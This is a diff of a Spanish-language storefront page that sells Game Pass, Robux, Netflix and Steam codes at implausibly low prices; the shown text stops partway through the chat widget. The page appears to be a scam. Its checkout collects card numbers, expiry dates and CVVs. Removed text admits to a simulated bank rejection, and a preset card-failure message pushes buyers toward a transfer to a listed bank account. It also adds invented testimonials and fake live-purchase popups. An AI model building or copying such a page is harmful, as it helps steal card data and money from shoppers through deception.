@@ -28,9 +28,6 @@
             padding: 20px 0;
             text-align: center;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
         }
 
         header h1 {
@@ -38,227 +35,226 @@
             font-weight: 600;
         }
 
+        header p {
+            font-size: 1.2em;
+        }
+
         nav {
-            margin-top: 10px;
+            background: #444;
+            padding: 10px 0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
-        nav a {
-            color: white;
-            text-decoration: none;
-            padding: 10px 15px;
-            font-size: 1.1em;
-            transition: background-color 0.3s;
+        nav ul {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            list-style: none;
         }
 
-        nav a:hover {
-            background-color: #555;
-            border-radius: 5px;
-        }
-
-        /* --- Contenido Principal --- */
-        main {
-            padding: 40px 20px;
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .section-title {
-            text-align: center;
-            font-size: 2em;
-            margin-bottom: 30px;
-            color: #555;
-        }
-
-        /* --- Grid de Productos --- */
-        .products-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-        }
-
-        .product-card {
-            background: white;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            text-align: center;
-            transition: transform 0.3s, box-shadow 0.3s;
-            cursor: pointer;
-        }
-
-        .product-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
-        }
-
-        .product-card img {
-            width: 100%;
-            height: 200px;
-            object-fit: cover;
-            border-bottom: 1px solid #eee;
-        }
-
-        .product-info {
-            padding: 20px;
-        }
-
-        .product-info h3 {
-            font-size: 1.4em;
-            margin-bottom: 5px;
-            color: #333;
-        }
-
-        .product-info p {
-            font-size: 1.1em;
-            color: #777;
-            margin-bottom: 15px;
-        }
-
-        .product-info button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-size: 1em;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-
-        .product-info button:hover {
-            background-color: #0056b3;
-        }
-
-        /* --- Panel de Pago --- */
-        #paymentPanel {
-            display: none;
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
-            max-width: 600px;
-            margin: 40px auto;
-        }
-
-        #paymentPanel h2 {
-            font-size: 1.8em;
-            margin-bottom: 20px;
-            border-bottom: 2px solid #eee;
-            padding-bottom: 10px;
-        }
-
-        #paymentPanel label {
-            display: block;
-            margin-bottom: 8px;
+        nav ul li {
+            text-transform: uppercase;
             font-weight: 600;
         }
 
-        #paymentPanel input[type="email"],
-        #paymentPanel input[type="text"],
-        #paymentPanel input[type="number"] {
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+            padding: 5px 10px;
+            transition: background 0.3s ease;
+        }
+
+        nav ul li a:hover {
+            background-color: #ff7f50;
+            border-radius: 5px;
+        }
+
+        /* --- Productos y Contenedores --- */
+        .section {
+            padding: 40px 0;
+        }
+
+        .container {
+            width: 90%;
+            margin: 50px auto;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+        }
+
+        .product {
+            background: #ffffff;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            transition: transform 0.3s ease;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .product:hover {
+            transform: translateY(-10px);
+        }
+
+        .product img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+        }
+
+        /* ESTILOS DE PRODUCTOS */
+        .game-pass-bg {
+            background-color: #2c9b6f;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .robux-bg {
+            background-color: #333333;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .netflix-bg { 
+            background-color: #e50914;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .steam-bg { 
+            background-color: #1b2838;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+        
+        .product-details {
+             padding: 0 15px 15px 15px;
+             display: flex;
+             flex-direction: column;
+             justify-content: flex-end;
+             align-items: center;
+             height: 100%;
+        }
+
+        .product-details h3 {
+            margin-top: 10px;
+            font-size: 1.6em;
+        }
+
+        .product-details p {
+            margin-top: 5px;
+            margin-bottom: 15px;
+        }
+
+        .price {
+            font-size: 1.5em;
+            font-weight: 600;
+            color: #ff7f50;
+            margin-bottom: 20px;
+            background-color: #fff;
+            padding: 10px;
+            border-radius: 5px;
+            width: 80%;
+            text-align: center;
+        }
+
+        .product-details button {
+            background-color: #ff7f50;
+            color: white;
+            font-size: 1.2em;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            width: 100%;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .product-details button:hover {
+            background-color: #e35d30;
+        }
+
+        /* --- Panel de Pago (Comprar Section) --- */
+        .payment-panel {
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 600px; 
+            margin: 30px auto;
+            display: none;
+        }
+
+        /* Campos de formulario */
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        .form-group input {
             width: 100%;
             padding: 10px;
-            margin-bottom: 15px;
             border: 1px solid #ccc;
             border-radius: 5px;
             font-size: 1em;
         }
         
-        .input-error {
-            border-color: red !important;
-            box-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
-        }
-
-        .payment-method-selection {
-            display: flex;
-            gap: 20px;
-            margin-bottom: 20px;
-        }
-
-        .payment-method-selection label {
-            display: flex;
-            align-items: center;
-            font-weight: 400;
-            cursor: pointer;
-        }
-        
-        .card-details-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-        }
-
-        .full-width {
-            grid-column: 1 / -1;
-        }
-
-        #payButton {
-            background-color: #2c9b6f;
-            color: white;
-            width: 100%;
-            padding: 15px;
-            border: none;
-            border-radius: 5px;
-            font-size: 1.1em;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        #payButton:hover {
-            background-color: #247a56;
-        }
-
-        #transferencia {
-            border: 1px dashed #007bff;
-            padding: 15px;
-            margin-top: 15px;
-            background-color: #f0f8ff;
-            display: none;
-            border-radius: 5px;
-        }
-        
-        .card-input-container {
-            position: relative;
-        }
-        
+        /* Icono de tarjeta y errores */
         .card-icon {
             position: absolute;
-            top: 10px;
-            right: 10px;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
             font-size: 1.5em;
             color: #ccc;
+            pointer-events: none;
+            transition: color 0.3s;
         }
         
-        #cardStatus {
-            font-size: 0.9em;
-            margin-top: -10px;
-            margin-bottom: 10px;
-            padding-left: 5px;
-            min-height: 20px; 
+        .form-group #tarjeta-numero {
+            padding-right: 50px;
+        }
+        
+        .input-error {
+            border: 2px solid red !important;
         }
 
-        #errorMessage {
+        .error-message {
             color: red;
-            background-color: #ffe0e0;
+            background-color: #fdd;
             border: 1px solid red;
             padding: 10px;
             border-radius: 5px;
             margin-top: 15px;
             display: none;
-            font-weight: 600;
         }
 
+        /* Spinner de carga */
         .spinner {
             border: 4px solid #f3f3f3;
-            border-top: 4px solid #2c9b6f;
+            border-top: 4px solid #ff7f50;
             border-radius: 50%;
-            width: 20px;
-            height: 20px;
+            width: 30px;
+            height: 30px;
             animation: spin 1s linear infinite;
-            margin-right: 10px;
+            margin: 15px auto;
             display: none;
         }
 
@@ -267,694 +263,899 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* --- Footer --- */
-        footer {
-            background: #222;
-            color: white;
+        /* --- Testimoniales y Reseñas --- */
+        .section.reseñas {
+            background-color: #e9e9e9;
             text-align: center;
-            padding: 20px 0;
-            margin-top: 50px;
+            padding: 60px 20px;
+        }
+        .testimonial-grid {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 30px;
+        }
+        .testimonial-card {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: left;
+            position: relative;
+        }
+        .testimonial-card .stars {
+            color: #ffd700;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+        .testimonial-card .quote {
+            font-style: italic;
+            margin-bottom: 15px;
+            color: #555;
+        }
+        .testimonial-card .author {
+            font-weight: 600;
+            color: #333;
+            display: block;
+            margin-top: 10px;
+            font-size: 0.9em;
+        }
+
+        /* --- Alerta de Prueba Social Flotante --- */
+        #social-proof-alert {
+            position: fixed;
+            bottom: 30px;
+            left: 30px;
+            background-color: white;
+            border: 1px solid #2c9b6f;
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s, visibility 0.5s, transform 0.5s;
+            transform: translateX(-100%);
+        }
+
+        #social-proof-alert.show {
+            opacity: 1;
+            visibility: visible;
+            transform: translateX(0);
+        }
+
+        #social-proof-alert i {
+            color: #2c9b6f;
+            font-size: 1.5em;
+            margin-right: 10px;
+        }
+
+        #social-proof-alert .text strong {
+            color: #ff7f50;
+        }
+
+        #social-proof-alert .stars-small {
+            color: #ffd700;
+            font-size: 0.9em;
         }
         
-        /* --- Chat Flotante --- */
-        .chat-toggle {
+        /* --- ESTILOS PARA EL CHAT --- */
+
+        /* Botón Flotante */
+        #chat-button {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: #4CAF50;
+            bottom: 30px;
+            right: 30px;
+            width: 60px;
+            height: 60px;
+            background-color: #ff7f50;
             color: white;
             border: none;
             border-radius: 50%;
-            width: 60px;
-            height: 60px;
             font-size: 1.5em;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
             cursor: pointer;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            z-index: 1001;
+            z-index: 1000;
             transition: background-color 0.3s;
         }
-        
-        .chat-toggle:hover {
-            background-color: #45a049;
+
+        #chat-button:hover {
+            background-color: #e35d30;
         }
 
+        /* Contenedor del Chat */
         #chat-window {
             position: fixed;
-            bottom: 90px;
-            right: 20px;
-            width: 300px;
-            height: 400px;
-            background: white;
+            bottom: 100px;
+            right: 30px;
+            width: 350px;
+            height: 450px;
+            background-color: white;
             border-radius: 10px;
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
             display: none;
             flex-direction: column;
+            z-index: 999;
             overflow: hidden;
-            z-index: 1000;
+            animation: fadeIn 0.3s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
+        /* Encabezado del Chat */
         .chat-header {
-            background-color: #4CAF50;
+            background-color: #333;
             color: white;
-            padding: 10px;
+            padding: 15px;
             text-align: center;
+            font-size: 1.1em;
             font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
 
+        .chat-header .close-btn {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.2em;
+            cursor: pointer;
+        }
+
+        /* Cuerpo de Mensajes */
         #chat-body {
             flex-grow: 1;
-            padding: 10px;
+            padding: 15px;
             overflow-y: auto;
-            background-color: #f9f9f9;
+            background-color: #f7f7f7;
+            display: flex;
+            flex-direction: column;
         }
 
+        .message {
+            margin-bottom: 10px;
+            max-width: 80%;
+            border-radius: 10px;
+            padding: 8px 12px;
+            line-height: 1.4;
+        }
+
+        .ai-message {
+            background-color: #e0e0e0;
+            align-self: flex-start;
+            margin-right: auto;
+        }
+
+        .user-message {
+            background-color: #ff7f50;
+            color: white;
+            align-self: flex-end;
+            margin-left: auto;
+        }
+
+        .typing-indicator {
+            padding: 5px 10px;
+            background-color: #f0f0f0;
+            border-radius: 10px;
+            font-style: italic;
+            color: #777;
+            display: none;
+            margin-bottom: 10px;
+        }
+        
+        /* Área de Entrada */
         .chat-input {
             display: flex;
-            border-top: 1px solid #ccc;
+            padding: 10px;
+            border-top: 1px solid #ddd;
         }
 
         #chat-input-field {
             flex-grow: 1;
             padding: 10px;
-            border: none;
-            resize: none;
+            border: 1px solid #ccc;
+            border-radius: 20px;
+            margin-right: 10px;
         }
 
-        .chat-input button {
-            background-color: #4CAF50;
+        #chat-send-btn {
+            background-color: #ff7f50;
             color: white;
             border: none;
-            padding: 10px 15px;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
             cursor: pointer;
+            font-size: 1.1em;
             transition: background-color 0.3s;
         }
 
-        .chat-input button:hover {
-            background-color: #45a049;
-        }
-        
-        .message {
-            margin-bottom: 10px;
-            padding: 8px 12px;
-            border-radius: 15px;
-            max-width: 80%;
-            word-wrap: break-word;
+        #chat-send-btn:hover {
+            background-color: #e35d30;
         }
 
-        .user-message {
-            background-color: #dcf8c6;
-            align-self: flex-end;
-            margin-left: auto;
-        }
-
-        .ai-message {
-            background-color: #ebebeb;
-            align-self: flex-start;
-        }
-
-        #typing-indicator {
-            font-style: italic;
-            color: #777;
-            padding: 5px 12px;
-            display: none;
-        }
-        
-        /* --- Prueba Social Flotante --- */
-        #social-proof-alert {
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            background-color: rgba(0, 0, 0, 0.8);
+        /* --- Estilos para Contacto --- */
+        #contacto-info {
+            background-color: #333;
             color: white;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            opacity: 0;
-            transform: translateX(-100%);
-            transition: opacity 0.5s, transform 0.5s;
-            z-index: 999;
-            display: flex;
-            align-items: center;
+            padding: 60px 20px;
+            text-align: center;
+        }
+        #contacto-info h2 {
+            font-size: 2.2em;
+            margin-bottom: 20px;
+        }
+        .contact-detail {
+            font-size: 1.3em;
+            margin: 15px 0;
+        }
+        .contact-detail a {
+            color: #ff7f50;
+            text-decoration: none;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+        .contact-detail a:hover {
+            color: #ffffff;
         }
 
-        #social-proof-alert.show {
-            opacity: 1;
-            transform: translateX(0);
-        }
-
-        #social-proof-alert i {
-            color: #FFC107; /* Color dorado para las estrellas */
-            margin-right: 5px;
-        }
-
-        .social-proof-icon {
-            font-size: 1.8em;
-            margin-right: 10px;
-            color: #007bff;
-        }
     </style>
 </head>
 <body>
 
-    <header>
-        <h1>🎮 Tienda de Códigos Digitales GC 💸</h1>
-        <nav>
-            <a href="#products" onclick="scrollToSection('products')">Productos</a>
-            <a href="#about" onclick="scrollToSection('about')">Acerca de</a>
-            <a href="#contact" onclick="scrollToSection('contact')">Contacto</a>
-        </nav>
-    </header>
+<header>
+    <h1>Compra tus Gift Cards de Game Pass y Robux</h1>
+    <p>Las mejores ofertas para gamers como tú</p>
+</header>
 
-    <main>
-        <div id="social-proof-alert">
-            <i class="social-proof-icon fas fa-shopping-cart"></i>
-            <div>
-                <span id="alert-text"></span>
-                <div id="alert-stars"></div>
+<nav>
+    <ul>
+        <li><a href="#" onclick="scrollToSection('productos')">Productos</a></li>
+        <li><a href="#" onclick="scrollToSection('ofertas')">Ofertas</a></li>
+        <li><a href="#" onclick="scrollToSection('testimonios')">Reseñas</a></li> 
+        <li><a href="#" onclick="scrollToSection('compra')">Comprar</a></li>
+        <li><a href="#" onclick="scrollToSection('contacto-info')">Contacto</a></li>
+    </ul>
+</nav>
+
+<div id="productos" class="section">
+    <div class="container">
+        
+        <div class="product game-pass-bg">
+            <img src="img/gamepass-card.png" alt="Xbox Game Pass 3 Meses">
+            <div class="product-details">
+                <h3>Game Pass Ultimate</h3>
+                <p>Accede a una librería de juegos increíbles por 3 meses.</p>
+                <div class="price"><span>$5.00 USD</span></div>
+                <button onclick="showPaymentPanel('Game Pass 3 Meses', 5.00)">Comprar Ahora</button>
             </div>
         </div>
 
-        <section id="products">
-            <h2 class="section-title">Nuestras Ofertas Digitales</h2>
-            <div class="products-grid">
-                
-                <div class="product-card" onclick="showPaymentPanel('Xbox Game Pass Ultimate (3 Meses)', 5.00)">
-                    <img src="img/gamepass-card.png" alt="Xbox Game Pass Ultimate">
-                    <div class="product-info">
-                        <h3>Xbox Game Pass Ultimate</h3>
-                        <p>3 Meses de Acceso Total</p>
-                        <p style="font-size: 1.5em; color: #2c9b6f;">$5.00 USD</p>
-                        <button>Comprar Ahora</button>
-                    </div>
-                </div>
-
-                <div class="product-card" onclick="showPaymentPanel('Robux (5,000)', 10.00)">
-                    <img src="img/robux-card.png" alt="Robux 5,000">
-                    <div class="product-info">
-                        <h3>5,000 Robux</h3>
-                        <p>Para desbloquear el mundo de Roblox</p>
-                        <p style="font-size: 1.5em; color: #2c9b6f;">$10.00 USD</p>
-                        <button>Comprar Ahora</button>
-                    </div>
-                </div>
-
-                <div class="product-card" onclick="showPaymentPanel('Netflix Gift Card (6 Meses)', 10.00)">
-                    <img src="img/netflix-card.png" alt="Netflix Gift Card">
-                    <div class="product-info">
-                        <h3>Netflix Gift Card</h3>
-                        <p>6 Meses de Servicio Premium</p>
-                        <p style="font-size: 1.5em; color: #2c9b6f;">$10.00 USD</p>
-                        <button>Comprar Ahora</button>
-                    </div>
-                </div>
-
-                <div class="product-card" onclick="showPaymentPanel('Steam Wallet ($50 USD)', 15.00)">
-                    <img src="img/steam-card.png" alt="Steam Wallet $50">
-                    <div class="product-info">
-                        <h3>Steam Wallet</h3>
-                        <p>Crédito de $50 USD para juegos</p>
-                        <p style="font-size: 1.5em; color: #2c9b6f;">$15.00 USD</p>
-                        <button>Comprar Ahora</button>
-                    </div>
-                </div>
-
+        <div class="product robux-bg">
+            <img src="img/robux-code.png" alt="5,000 Robux">
+            <div class="product-details">
+                <h3>5,000 Robux</h3>
+                <p>Crédito para personalizar tu avatar y obtener contenido exclusivo.</p>
+                <div class="price"><span>$10.00 USD</span></div>
+                <button onclick="showPaymentPanel('5000 Robux', 10.00)">Comprar Ahora</button>
             </div>
-        </section>
-
-        <section>
-            <div id="paymentPanel">
-                <h2 id="panelTitle">Comprar Producto</h2>
-                <div style="margin-bottom: 20px;">
-                    <span style="font-size: 1.2em; font-weight: 600;" id="totalAmount">Total: $0.00 USD</span>
-                </div>
-
-                <div class="full-width">
-                    <label for="email">Correo Electrónico para el Código:</label>
-                    <input type="email" id="email" placeholder="ejemplo@correo.com" required>
-                </div>
-                
-                <div style="border-top: 1px solid #eee; padding-top: 15px;">
-                    <p style="margin-bottom: 10px; font-weight: 600;">Selecciona Método de Pago:</p>
-                    <div class="payment-method-selection">
-                        <label>
-                            <input type="radio" name="paymentMethod" value="tarjeta" checked> Tarjeta de Crédito/Débito
-                        </label>
-                        <label>
-                            <input type="radio" name="paymentMethod" value="transferencia"> Transferencia Bancaria (KLAR)
-                        </label>
-                    </div>
-                </div>
-                
-                <div id="tarjeta">
-                    <div class="full-width card-input-container">
-                        <label for="tarjeta-numero">Número de Tarjeta:</label>
-                        <input type="text" id="tarjeta-numero" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCardNumber(this); detectCardType(this.value);" required>
-                        <i id="cardIcon" class="card-icon fas fa-credit-card"></i>
-                    </div>
-                    <div class="full-width" id="cardStatus"></div>
-                    
-                    <div class="card-details-grid">
-                        <div>
-                            <label for="expiracion">Fecha de Caducidad (MM/AA):</label>
-                            <input type="text" id="expiracion" placeholder="MM/AA" maxlength="5" oninput="formatExpiryDate(this)" required>
-                        </div>
-                        <div>
-                            <label for="cvv">CVV:</label>
-                            <input type="text" id="cvv" placeholder="CVV" maxlength="4" required>
-                        </div>
-                    </div>
-                </div>
-
-                <div id="transferencia">
-                    <p style="font-weight: 600; color: #007bff;">Instrucciones de Pago por Transferencia</p>
-                    <p>Banco: **KLAR**</p>
-                    <p>Cuenta CLABE: **661180006948807615**</p>
-                    <p>Beneficiario: **Tu Tienda GC**</p>
-                    <p style="margin-top: 10px;">*El código se enviará a tu correo **solo después** de verificar la transferencia.</p>
-                </div>
-                
-                <div id="errorMessage"></div>
-
-                <button id="payButton" onclick="processPayment()">
-                    <div id="spinner" class="spinner"></div>
-                    Pagar y Recibir Código
-                </button>
-            </div>
-        </section>
-
-        <section id="about" style="padding-top: 50px;">
-            <h2 class="section-title">Acerca de Nosotros</h2>
-            <div style="background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);">
-                <p>Somos distribuidores digitales de códigos de Game Pass, Robux, Netflix y Steam. Nuestro compromiso es ofrecer precios competitivos y entrega inmediata. Todos nuestros códigos son verificados y 100% funcionales. La seguridad es nuestra prioridad, por lo que tus datos de pago están protegidos (aunque simulamos un rechazo bancario para fines de inventario interno).</p>
-            </div>
-        </section>
-
-        <section id="contact" style="padding-top: 50px;">
-            <h2 class="section-title">Contáctanos</h2>
-            <div style="background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); text-align: center;">
-                <p>📧 Correo de Soporte: **soporte@tutiendagc.com**</p>
-                <p>💬 O utiliza nuestro chat flotante para preguntas rápidas.</p>
-            </div>
-        </section>
-    </main>
-
-    <footer>
-        <p>&copy; 2024 Tienda de Gift Cards GC. Todos los derechos reservados.</p>
-    </footer>
-
-    <div id="chat-window">
-        <div class="chat-header">Asistente Virtual (Bot)</div>
-        <div id="chat-body">
-            <div class="message ai-message">¡Hola! Soy tu asistente. Puedo ayudarte con preguntas sobre **precios**, **códigos**, o **métodos de pago**.</div>
-            <div id="typing-indicator">Escribiendo...</div>
         </div>
-        <div class="chat-input">
-            <input type="text" id="chat-input-field" placeholder="Escribe tu mensaje..." onkeypress="if(event.keyCode==13) sendMessage()">
-            <button onclick="sendMessage()"><i class="fas fa-paper-plane"></i></button>
+
+        <div class="product netflix-bg">
+            <img src="img/netflix-card.png" alt="Netflix 6 Meses">
+            <div class="product-details">
+                <h3>Netflix 6 Meses</h3>
+                <p>Suscripción de 6 meses por un precio único.</p>
+                <div class="price"><span>$10.00 USD</span></div>
+                <button onclick="showPaymentPanel('Netflix 6 Meses', 10.00)">Comprar Ahora</button>
+            </div>
+        </div>
+
+        <div class="product steam-bg">
+            <img src="img/steam-card.png" alt="Steam Wallet $50">
+            <div class="product-details">
+                <h3>Steam Wallet $50</h3>
+                <p>Agrega crédito para comprar tus juegos favoritos en Steam.</p>
+                <div class="price"><span>$15.00 USD</span></div>
+                <button onclick="showPaymentPanel('Steam Wallet $50', 15.00)">Comprar Ahora</button>
+            </div>
         </div>
     </div>
-    
-    <button class="chat-toggle" onclick="toggleChat()"><i class="fas fa-comments"></i></button>
-    
-    <script>
-        let currentProduct = { name: '', price: 0 };
-        const paymentPanel = document.getElementById('paymentPanel');
-        const totalAmountSpan = document.getElementById('totalAmount');
-        const transferPanel = document.getElementById('transferencia');
-        const cardPanel = document.getElementById('tarjeta');
-        const cardIcon = document.getElementById('cardIcon');
-        const cardStatus = document.getElementById('cardStatus'); 
-        const expiryInput = document.getElementById('expiracion');
-        const cvvInput = document.getElementById('cvv');
-        const cardNumInput = document.getElementById('tarjeta-numero');
-        const emailInput = document.getElementById('email'); 
-        const errorMessage = document.getElementById('errorMessage');
-        const chatWindow = document.getElementById('chat-window');
-        const chatBody = document.getElementById('chat-body');
-        const chatInputField = document.getElementById('chat-input-field');
-        const typingIndicator = document.getElementById('typing-indicator');
-        const socialProofAlert = document.getElementById('social-proof-alert');
-        const alertText = document.getElementById('alert-text');
-        const alertStars = document.getElementById('alert-stars');
+</div>
+
+<div id="ofertas" class="section" style="background-color: #f9f9f9;">
+    <div class="container">
+        <h2>Ofertas Especiales</h2>
+        <p>¡Próximamente se agregarán más ofertas! Mantente atento a nuestras promociones.</p>
+    </div>
+</div>
+
+<div id="testimonios" class="section reseñas">
+    <div class="container" style="flex-direction: column; margin-top: 0;">
+        <h2>Lo que dicen nuestros clientes (4.8/5.0 Estrellas)</h2>
+        <p style="margin-top: 10px; color: #555;">Más de 120 ventas verificadas en el último mes.</p>
+        <div class="testimonial-grid">
+            <div class="testimonial-card">
+                <div class="stars">★★★★★</div>
+                <p class="quote">"¡Funciona a la perfección! La transferencia fue rápida y me enviaron el código en menos de 10 minutos. Es la página más confiable que he encontrado."</p>
+                <span class="author">⭐ Luis R. - Compró Game Pass</span>
+            </div>
+            <div class="testimonial-card">
+                <div class="stars">★★★★☆</div>
+                <p class="quote">"El precio es imbatible. Pagué con tarjeta y tuve un pequeño problema que solucioné en el chat. Deberían mejorar la opción de tarjeta, pero el servicio es excelente."</p>
+                <span class="author">⭐ María V. - Compró 5,000 Robux</span>
+            </div>
+            <div class="testimonial-card">
+                <div class="stars">★★★★★</div>
+                <p class="quote">"Soy cliente recurrente. Siempre tienen buen stock y los códigos son legítimos. Altamente recomendado para evitar precios altos en tiendas oficiales."</p>
+                <span class="author">⭐ Roberto G. - Compró Game Pass</span>
+            </div>
+        </div>
+    </div>
+</div>
+<div id="compra" class="section">
+    <div class="payment-panel" id="paymentPanel">
+        <h2 id="panelTitle">Finalizar Compra</h2>
+        <p>Selecciona tu método de pago y proporciona los datos necesarios.</p>
+
+        <div class="form-group">
+            <label for="email">Correo Electrónico (Para envío del código):</label>
+            <input type="email" id="email" name="email" placeholder="tu_correo@ejemplo.com" required>
+        </div>
+
+        <div class="payment-options">
+            <label>
+                <input type="radio" name="paymentMethod" value="transferencia" checked> Transferencia Bancaria
+            </label>
+            <label>
+                <input type="radio" name="paymentMethod" value="tarjeta"> Tarjeta de Crédito/Débito
+            </label>
+        </div>
+
+        <div id="transferencia" class="form-panel">
+            <div class="form-group">
+                <label for="nombre">Nombre en la Cuenta Bancaria:</label>
+                <input type="text" id="nombre" name="nombre" placeholder="Pablo Israel" required>
+            </div>
+            <div class="form-group">
+                <label for="banco">Banco:</label>
+                <input type="text" id="banco" name="banco" value="Klar" disabled>
+            </div>
+            <div class="form-group">
+                <label for="cuenta">Número de Cuenta CLABE:</label>
+                <input type="text" id="cuenta" name="cuenta" value="661180006948807615" disabled>
+            </div>
+        </div>
+
+        <div id="tarjeta" class="form-panel" style="display: none;">
+            <div class="form-group">
+                <label for="tarjeta-numero">Número de Tarjeta:</label>
+                <input type="text" id="tarjeta-numero" name="tarjeta-numero" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required 
+                       oninput="formatCardNumber(this); detectCardType(this.value);" onchange="validateCardNumber()">
+                <i id="cardIcon" class="card-icon fas fa-credit-card"></i>
+            </div>
+            <p id="cardStatus" style="font-size: 0.9em; margin-top: -15px; margin-bottom: 10px;"></p>
+
+            <div class="form-group">
+                <label for="expiracion">Fecha de Caducidad (MM/AA):</label>
+                <input type="text" id="expiracion" name="expiracion" placeholder="MM/AA" maxlength="5" required oninput="formatExpiryDate(this)">
+            </div>
+            <div class="form-group">
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="cvv" placeholder="XXX" maxlength="4" required>
+            </div>
+        </div>
         
-        const purchases = [
-            { name: "Game Pass", user: "Raúl G.", stars: 5 },
-            { name: "5,000 Robux", user: "Ana P.", stars: 4 },
-            { name: "Game Pass", user: "Carlos M.", stars: 5 },
-            { name: "Netflix Gift Card", user: "Laura F.", stars: 5 }, 
-            { name: "Steam Wallet $50", user: "Marco T.", stars: 4 }, 
-            { name: "5,000 Robux", user: "Lucía S.", stars: 5 }
-        ];
+        <p id="totalAmount" style="text-align: right; font-size: 1.5em; font-weight: 600; margin-bottom: 20px; color: #333;">Total: $0.00 USD</p>
 
-        function generateStars(count) {
-            let starHtml = '';
-            for (let i = 0; i < 5; i++) {
-                starHtml += `<i class="fa${i < count ? 's' : 'r'} fa-star"></i>`;
-            }
-            return starHtml;
+        <button class="submit-button" onclick="processPayment()">Procesar Pago</button>
+
+        <div class="spinner" id="spinner"></div>
+
+        <div id="errorMessage" class="error-message">
+            Lo sentimos, hubo un problema con tu pago. Verifica los datos de tu tarjeta (caducidad/CVV) o elige otro método de pago.
+        </div>
+    </div>
+</div>
+
+<div id="contacto-info" class="section">
+    <h2>Contáctanos Directamente</h2>
+    <div class="contact-detail">
+        <i class="fas fa-envelope"></i> Correo Electrónico: 
+        <a href="mailto:ley120ko@gmail.com">ley120ko@gmail.com</a>
+    </div>
+    <div class="contact-detail">
+        <i class="fas fa-phone"></i> Número de Teléfono: 
+        <a href="tel:+12296558023">+1 229 655 8023</a>
+    </div>
+</div>
+
+<footer>
+    <p>&copy; 2025 Tienda de Gift Cards | Todos los derechos reservados</p>
+    <p>Política de privacidad | Términos de servicio</p>
+</footer>
+
+<div id="social-proof-alert">
+    <i class="fas fa-shopping-bag"></i>
+    <div class="text">
+        <span id="alert-text"></span>
+        <div id="alert-stars" class="stars-small"></div>
+    </div>
+</div>
+<button id="chat-button" onclick="toggleChat()">
+    <i class="fas fa-comment-dots"></i>
+</button>
+
+<div id="chat-window">
+    <div class="chat-header">
+        Soporte 24/7 (IA)
+        <button class="close-btn" onclick="toggleChat()">&times;</button>
+    </div>
+    <div id="chat-body">
+        <div class="message ai-message">
+            ¡Hola! Soy la asistente IA de TuTiendaGC. ¿En qué puedo ayudarte hoy? (Prueba a preguntar sobre precios o códigos).
+        </div>
